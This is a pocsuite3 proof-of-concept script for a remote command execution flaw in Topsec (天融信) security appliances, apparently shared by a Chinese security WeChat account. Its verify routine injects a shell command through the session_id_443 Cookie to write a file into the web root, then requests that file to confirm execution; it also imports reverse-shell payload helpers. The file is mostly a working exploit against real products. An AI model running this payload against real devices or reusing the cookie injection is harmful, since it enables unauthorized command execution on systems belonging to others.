# _*_ coding:utf-8 _*_
# @Time : 2024/1/2 10:38
# @Author: 为赋新词强说愁
import time

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class tosec_maincig(POCBase):
    pocDesc = '''天融信TOPSEC Cookie 远程命令执行漏洞'''
    vulID = '1'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-23'
    createDate = '2023-11-23'
    updateDate = '2023-11-23'
    name = '天融信TOPSEC Cookie 远程命令执行漏洞'
    appName = '天融信TOPSEC'

    def _verify(self):

        result = {}
        path = """/cgi/maincgi.cgi?Url=check"""
        path1= "/site/image/security1.txt"
        check_url = self.url + path1
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Cookie": "session_id_443=1|echo 'vulnerability' >> /www/htdocs/site/image/security1.txt;"

        }
        url = self.url + path
        payload = """
        GET /cgi/maincgi.cgi?Url=check HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Dnt: 1
        Upgrade-Insecure-Requests: 1
        Connection: close
        Cookie: session_id_443=1|echo 'vulnerability' >> /www/htdocs/site/image/security1.txt;
        """
        try:
            response = requests.get(url, headers=headers)
            time.sleep(2)
            response1 = requests.get(check_url, headers=headers)
            if response.status_code == 200 and response1.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(tosec_maincig)